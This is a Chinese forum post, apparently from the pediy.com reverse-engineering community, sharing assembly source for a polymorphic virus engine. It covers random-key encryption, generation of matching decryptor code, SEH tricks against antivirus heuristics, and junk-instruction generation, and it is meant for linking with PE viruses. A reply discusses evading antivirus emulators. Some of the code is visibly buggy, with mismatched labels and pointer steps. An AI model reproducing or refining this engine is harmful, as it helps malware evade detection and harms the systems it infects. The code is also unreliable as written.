
# CJPE32 多态引擎完整架构及其实现

> 原文：[`www.pediy.com/kssd/pediy10/88319.html`](https://www.pediy.com/kssd/pediy10/88319.html)

近来看了一些有关多态引擎方面的资料，也试着写了一个！现将源代码公布出来，希望高手们可以指点指点，以期更进一步的改进！

## 一. 随机数生成算法

在我看来，多态引擎的核心在于随机数生成算法，我在这个引擎中使用的是最常见的随机算法，也即是用 `RDTCS` 指令来产生随机数，以后如果有更好的随机算法，再修改！具体代码如下：

```
;---------------------------------------------------------------------------------------------
;入口参数:[esp+8]
;出口参数:eax=随机数
;函数功能:产生 0---[[esp+8]-1 之间的随机数或一个无范围的随机数
;需注意:此处的[esp+4]存放的是此函数的返回地址,也即是调用此函数的下一条指令的地址
;调用此函数需特别注意平衡堆栈问题

Random proc
    push edx                ;保存 edx,用于暂存余数
    db 0fh, 31h            ;586 RDTCS 指令，取 CPU 计数器，做随机数种子
    ;读取的 CPU 计数值送入 edx:eax 中
    xor edx, edx          ;edx 清 0
    cmp dword ptr [esp+8], edx ;判断[esp+8]是否为 0
    je  _ret              ;若是 0,则不必再产生随机数
    div dword ptr [esp+8] ;eax 除以[esp+8]
    xchg eax, edx         ;交换结果,eax=计算之后的余数
_ret:
    pop edx               ;恢复 edx 的值
    ret
Random endp
```

## 二. 加密算法

对于数据的加密，现在有很多高强度的算法，也有很多高手比我更精通数据的加密！我在这个引擎中，使用的加密算法很简单，总共有六套加密方案：

分别是：`xor` 加密，`add` 加密，`sub` 加密，`not` 加密，`Ror` 加密，`Rol` 加密！目前使用的加密方案就是这六种！这六种加密方案的执行，由随机数来控制！

代码如下：

```
;入口参数:
; ecx=欲加密数据的长度
; esi=欲加密数据的开始地址
;函数功能:此函数会产生六套加密方案

EncryptCode proc
    push 0
    call Random
    add esp, 4
    mov edx, eax
    mov Key, eax ;保存加/解密密钥
    push 6
    call Random ;调用此函数产生 0 到 5 之间的随机数，用于界定六种不同的加密方案
    add esp, 4
    cmp eax, 0
    jz StartEncrypt_Xor
    cmp eax, 1
    jz StartEncrypt_Sub
    cmp eax, 2
    jz StartEncrypt_Add
    cmp eax, 3
    jz StartEncrypt_Not
    cmp eax, 4
    jz StartEncrypt_Ror
    cmp eax, 5
    jz StartEncrypt_Rol

StartEncrypt_Xor: ;进行异或加密
    mov eax, dword ptr [esi]
    xor eax, edx
    stosd
    inc esi
    dec ecx
    jnz StartEncrypt_Xor
    mov Method, 0
    ret

StartEncrypt_Sub: ;进行 sub 加密
    mov eax, dword ptr [esi]
    sub eax, edx
    stosd
    inc esi
    dec ecx
    jnz StartEncrypt_Sub
    mov Method, 1
    ret

StartEncrypt_Add: ;进行 add 加密
    mov eax, dword ptr [esi]
    add eax, edx
    stosd
    inc esi
    dec ecx
    jnz StartEncrypt_Add
    mov Method, 2
    ret

StartEncrypt_Not: ;进行 not 加密
    mov eax, dword ptr [esi]
    not eax
    stosd
    inc esi
    dec ecx
    jnz StartEncrypt_Not
    mov Method, 3
    ret

StartEncrypt_Ror: ;进行 ror 加密
    mov eax, dword ptr [esi]
    mov cl, dl
    ror eax, cl
    stosd
    inc esi
    dec ecx
    jnz StartEncrypt_Ror
    mov Method, 4
    ret

StartEncrypt_Rol: ;进行 Rol 加密
    mov eax, dword ptr [esi]
    mov cl, dh
    rol eax, cl
    stosd
    inc esi
    dec ecx
    jnz StartEncrypt_Rol
    mov Method, 5
    ret

EncryptCode endp
```

## 三. 解密算法

解密算法也很简单，这里不具体说明了，看下面的代码就可以了：

```
;此函数会产生 6 套不同的解密方案

DecryptCode proc
    mov ebx, Key
    cmp Method, 0
    jz DecryptData_Xor
    cmp Method, 1h
    jz DecryptData_Sub
    cmp Method, 2h
    jz DecryptData_Add
    cmp Method, 3h
    jz DecryptData_Not
    cmp Method, 4h
    jz DecryptData_Ror
    cmp Method, 5h
    jz DecryptData_Rol

DecryptData_Xor:
    mov byte ptr [edi], 35h ;xor eax,imm32
    mov dword ptr [edi+1], ebx
    add edi, 5h
    ret

DecryptData_Add:
    mov byte ptr [edi], 2dh ;sub eax,imm32
    mov dword ptr [edi+1], ebx
    add edi, 5h
    ret

DecryptData_Sub:
    mov byte ptr [edi], 05h ;add eax,imm32
    mov dword ptr [edi+1], ebx
    add edi, 5h
    ret

DecryptData_Not:
    mov word ptr [edi], 0d0f7h ;not eax
    add edi, 2h
    ret

DecryptData_Ror:
    mov word ptr [edi], 8acbh ;产生 mov cl,bl 指令
    add edi, 2h
    mov word ptr [edi], 0d3c0h ;产生 rol eax,cl 指令
    add edi, 2h
    ret

DecryptData_Rol:
    mov word ptr [edi], 8acfh ;mov cl,bh
    add edi, 2h
    mov word ptr [edi], 0d3c8h ;ror eax,cl
    add edi, 2h
    ret

DecryptCode endp
```

## 四. 用于对抗启发式扫描引擎的 SEH 结构化异常

对于 `SEH` 结构化异常，我相信有很多高手比我更加精通。在这里，我只引发了三个异常，分别是：`int 3`，除 `0` 中断，`inc`/`dec` `dword` `ptr` `[0]`。高手们可以根据自己的需要来增加其他的 `SEH` 异常！

```
;               push 3
;               call Random
;               add  esp,4
;               cmp  eax,0
;               jz   SEH_1
;               cmp  eax,1
;               jz   SEH_2
;
;               mov  eax,0cd03h
;               stosw
;               ret
;
;SEH_1:                ;产生除 0 中断
;               push 3
;               call Random
;               add  esp,3
;               cmp  eax,0
;               jz   nextB_3
;               cmp  eax,1
;               jz   nextB_4
;               mov  al,0b9h        ;mov ecx,...指令机器码
;               stosb
;               xor  eax,eax        ;此处产生 mov ecx,0 指令
;               stosd
;               jmp  _div
;nextB_3:
;               mov  ax,0c92bh      ;产生 sub ecx,ecx 指令
;               stosw
;               jmp  _div
;nextB_4:
;               mov  ax,0c933h      ;产生 xor ecx,ecx 指令
;               stosw
;_div:
;               call rjunk
;               mov  ax,0f1f7h      ;div ecx 指令机器码
;               stosw
;               ret
;
;
;SEH_2:                ;产生 inc byte ptr [0]或 dec byte ptr [0]中断
;               push 3
;               call Random
;               add  esp,4
;               cmp  eax,0
;               jz   nextB_3
;               cmp  eax,1
;               jz   nextB_4
;               mov  al,0b9h        ;mov ecx,...指令机器码
;               stosb
;               xor  eax,eax        ;此处产生 mov ecx,0 指令
;               stosd
;               jmp  _Inc_Or_Dec
;SEH_21:
;               mov  ax,0c92bh      ;产生 sub ecx,ecx 指令
;               stosw
;               jmp  _Inc_Or_Dec
;SEH_22:
;               mov  ax,0c933h      ;产生 xor ecx,ecx 指令
;               stosw
;_Inc_Or_Dec:
;               push 2
;               call Random
;               add  esp,4
;               cmp  eax,0
;               jz   SEH_23
;               mov  eax,0fe09h     ;dec byte ptr [ecx]
;               stosw
;               ret
;SEH_23:
;               mov  eax,0fe01h     ;dec byte ptr [ecx]
;               stosw
;               ret
```

## 五. 垃圾指令生成

为了干扰病毒分析人员的逆向分析，垃圾指令就是一个很好的解决方案。当然这里的垃圾指令不能影响正常代码指令的执行！这一点相当关键！

你可以根据自己的需要来产生不同字节长度的垃圾指令！



```
rjunk      proc  

            push 6  

        call Random  

        add  esp,4  

        cmp  eax,0  

        jz   rjunk_0  

        cmp  eax,1  

        jz   rjunk_1  

        cmp  eax,2  

        jz   rjunk_2  

        cmp  eax,3  

        jz   rjunk_3  

        cmp  eax,4  

        jz   rjunk_4  

        call junk4  

        ret  

rjunk_0:  

            call junk1  

        ret  

rjunk_1:  

            call junk2  

        ret  

rjunk_2:  

            call junk3  

        ret  

rjunk_3:  

            call junk5  

            ret  

rjunk_4:  

            call junk6  

        ret  

rjunk      endp  
```

上面的一些函数由于空间问题无法完全贴出来，可以在附件中找到！

### 五、存在的问题和改进方案

这个多态引擎如果和 `PE` 病毒链接在一起，会遇到一些代码重定位的问题，需要高手们耐心调试！

**改进方案：**

在这个引擎中，我在加密和解密的过程中，使用的寄存器都是 `eax`，在我看来，这并不完美！这个寄存器应该是随机生成的，以后有时间会改进这个问题，使之达到随机生成！

### 六、总结

上面是我写这个多态引擎的一些重要思路！其他的细节问题，可到附件中找到源代码查看！

希望高手们可以指点下！

#### 上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) | `CJPE32 多态引擎源代码.rar` |
| :--- | :--- |

### 代码审查反馈

随机数引擎有问题。`BPE32B` 那种——也就是你这样的 `RDTCS` 指令的问题，有的 `CPU` 下取到的数永远都是双数，所以整除 `2` 的时候 `mod` 始终是 `0`。很容易陷入死循环。

另外你那种 `SEH` 无意义。现在的 `VM` 都可以模拟和分析了。

想要实现特定效果，就需要另外的方式，例如使用一些 `DrX` 解码之类的——有些 `VM` 做的不好是无法分析的。

**加密：** 不如做成随机组合算法岂不是更妙？

`ANTI-AV-VM`——是 `AV` 使用的 `VM`。

有几万种方法成千上万中方法，`AV` 的 `VM` 完全可以无视。即使以后发展出无分支、多路模拟，也是没有任何意义的，前提是某个 `XX` 写出一款专门针对 `AV-VM` 进行攻击的壳——又不去和 `AV` 公司合作的话。

但是不表示就没有用了。没有壳的情况下进行启发式查杀还是很具有权威性的，毕竟全程 `VM` 模拟运行很消耗资源。
